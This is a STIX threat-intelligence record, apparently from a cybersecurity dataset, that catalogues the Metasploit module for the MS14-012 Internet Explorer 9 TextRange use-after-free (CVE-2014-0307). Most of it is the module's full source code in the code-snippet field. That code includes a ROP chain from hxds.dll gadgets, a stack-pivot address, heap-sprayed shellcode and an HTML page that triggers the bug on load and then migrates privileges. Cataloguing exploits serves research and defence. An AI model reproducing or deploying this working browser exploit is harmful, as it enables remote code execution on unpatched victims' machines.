{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1991f2cf-d543-4dbb-93be-a33dde5f37f2",
    "created": "2024-08-14T16:45:02.047597Z",
    "modified": "2024-08-14T16:45:02.047601Z",
    "name": "\"MS14-012 Microsoft Internet Explorer TextRange Use-After-Free\"",
    "description": " This module exploits a use-after-free vulnerability found in Internet Explorer. The flaw was most likely introduced in 2013, therefore only certain builds of MSHTML are affected. In our testing with IE9, these vulnerable builds appear to be between 9.0.8112.16496 and 9.0.8112.16533, which implies the vulnerability shipped between August 2013, when it was introduced, until the fix issued in early March 2014.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms14_012_textrange.rb",
            "external_id": "ms14_012_textrange.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0307"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS14-012 Microsoft Internet Explorer TextRange Use-After-Free\",\n      'Description'    => %q{\n        This module exploits a use-after-free vulnerability found in Internet Explorer. The flaw\n        was most likely introduced in 2013, therefore only certain builds of MSHTML are\n        affected. In our testing with IE9, these vulnerable builds appear to be between\n        9.0.8112.16496 and 9.0.8112.16533, which implies the vulnerability shipped between\n        August 2013, when it was introduced, until the fix issued in early March 2014.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Jason Kratzer', # Original discovery\n          'sinn3r'         # Port\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2014-0307' ],\n          [ 'MSB', 'MS14-012' ]\n        ],\n      'Platform'       => 'win',\n      'BrowserRequirements' =>\n        {\n          :source  => /script/i,\n          :os_name => OperatingSystems::WINDOWS,\n          :ua_name => HttpClients::IE,\n          :office  => \"2010\",\n          :ua_ver  => '9.0',\n          :mshtml_build => lambda { |ver| ver.to_i.between?(16496, 16533) } # Covers MS13-Jul to MS14-Feb\n        },\n      'Targets'        =>\n        [\n          [\n            'Automatic',\n              {\n                # mov eax,dword ptr [edx+0C4h]; call eax\n                'Pivot' => 0x0c0d1020 # ECX\n              }\n          ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars'       => \"\\x00\",\n          'PrependEncoder' => \"\\x81\\xc4\\x0c\\xfe\\xff\\xff\" # add esp, -500\n        },\n      'DefaultOptions'  =>\n        {\n          'Retries'              => false, # You're too kind, tab recovery, I only need 1 shell.\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'DisclosureDate' => '2014-03-11', # Vuln was found in 2013. Mar 11 = Patch tuesday\n      'DefaultTarget'  => 0))\n  end\n\n  # hxds.dll\n  def get_payload\n    setup =\n    [\n      0x51C3B376, # rop nop\n      0x51C2046E, # pop edi; ret\n      0x51BE4A41, # xchg eax, esp; ret\n    ].pack(\"V*\")\n\n    # rop nops\n    45.times { setup << [0x51C3B376].pack('V*') }\n\n    setup << [\n      0x51C2046E, # pop edi ; ret\n      0x51BD28D4  # mov eax, [ecx], call [eax+8]\n    ].pack('V*')\n\n    p = generate_rop_payload('hxds', payload.encoded, {'target'=>'2010', 'pivot'=>setup})\n\n    Rex::Text.to_unescape(p)\n  end\n\n  def exploit_html\n    template = %Q|<!DOCTYPE html>\n<html>\n  <head>\n    <meta http-equiv='Cache-Control' content='no-cache'/>\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" >\n    <script>\n      <%=js_property_spray%>\n      sprayHeap({shellcode:unescape(\"<%=get_payload%>\")});\n\n      function hxds() {\n        try {\n          location.href = 'ms-help:';\n        } catch(e) {}\n      }\n\n      function strike() {\n        hxds();\n        var fake = \"\";\n        for (var i = 0; i < 12; i++) {\n          if (i==0) {\n             fake += unescape(\"<%=Rex::Text.to_unescape([target['Pivot']].pack('V*'))%>\");\n          }\n          else {\n            fake += \"\\\\u4141\\\\u4141\";\n          }\n        }\n\n        var elements = [\n          'FOOTER', 'VIDEO', 'HTML', 'DIV', 'WBR', 'THEAD', 'PARAM', 'SECTION', 'IMG',\n          'TIME', 'ASISE', 'CANVAS', 'P', 'RT', 'FRAMESET', 'TRACK', 'CAPTION'\n        ];\n\n        for (var i = 0; i < elements.length; i++) {\n          var element = document.createElement(elements[i]);\n          document.body.appendChild(element);\n        }\n\n        var tRange = document.body.createTextRange();\n        tRange.moveToElementText(document.body.children[16]);\n        tRange.execCommand('InsertInputSubmit', true, null);\n        tRange.moveToElementText(document.body.children[0]);\n        tRange.moveEnd('character',4);\n        tRange.execCommand('InsertOrderedList', true, null);\n        tRange.select();\n        tRange.moveToElementText(document.body.children[0]);\n        tRange.moveEnd('character',13);\n        tRange.execCommand('Underline', true, null);\n        tRange.execCommand('RemoveFormat', true, null);\n        var fillObject = document.createElement('button');\n        fillObject.className = fake;\n      }\n    </script>\n  </head>\n  <body onload='strike();'></body>\n</html>\n    |\n\n    return template, binding()\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    send_exploit_html(cli, exploit_html)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-03-11, # Vuln was found in 2013. Mar 11 = Patch tuesday",
    "x_mitre_platforms": [
        "win'"
    ]
}